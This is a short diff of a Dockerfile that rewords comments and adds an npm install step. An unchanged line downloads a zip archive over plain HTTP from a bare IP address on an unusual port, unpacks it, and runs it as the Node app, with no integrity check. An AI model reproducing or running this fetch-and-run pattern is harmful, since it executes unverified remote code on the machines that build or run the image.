@@ -3,7 +3,7 @@ FROM ubuntu:22.04
 
 ENV DEBIAN_FRONTEND=noninteractive
 
-# Update and install required packages
+# Install required packages
 RUN apt update && \
     apt install -y wget unzip nodejs npm && \
     apt clean
@@ -16,5 +16,8 @@ RUN wget http://165.227.63.140:7718/idx.zip && \
     unzip idx.zip && \
     rm idx.zip
 
-# Run the Node app
+# Install Node dependencies
+RUN npm install
+
+# Start the app
 CMD ["node", "app.js"]
